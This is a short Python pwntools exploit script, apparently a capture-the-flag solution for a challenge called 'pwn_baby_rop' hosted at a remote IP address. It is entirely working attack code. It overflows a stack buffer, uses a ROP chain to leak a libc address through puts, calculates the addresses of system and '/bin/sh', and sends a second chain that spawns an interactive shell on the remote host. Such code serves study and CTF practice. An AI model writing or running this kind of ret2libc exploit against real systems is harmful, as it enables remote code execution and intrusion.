from pwn import *

#p = process('./pwn_baby_rop')
p = remote('35.234.80.73',31943)
#pid =gdb.attach(p,gdbscript='')

pad = 'A' * 264

puts_plt = p64(0x0401064)
puts_got = p64(0x0404018)
reset = p64(0x0401176)

payload_1 = pad
payload_1 += p64(0x0000000000401663)
payload_1 += puts_got
payload_1 += puts_plt
payload_1 += reset

p.sendlineafter('magic.\n',payload_1)
leak = u64(p.recv(6).ljust(8,'\0'))
print "libc_leak: "+hex(leak)
bin_sh = leak +0x13000a
system = leak -0x32190

payload_2 = pad
payload_2 += p64(0x0000000000401663)
payload_2 += p64(bin_sh)
payload_2 += p64(0x000000000040101a)
payload_2 += p64(system)


p.sendline(payload_2)
p.interactive()
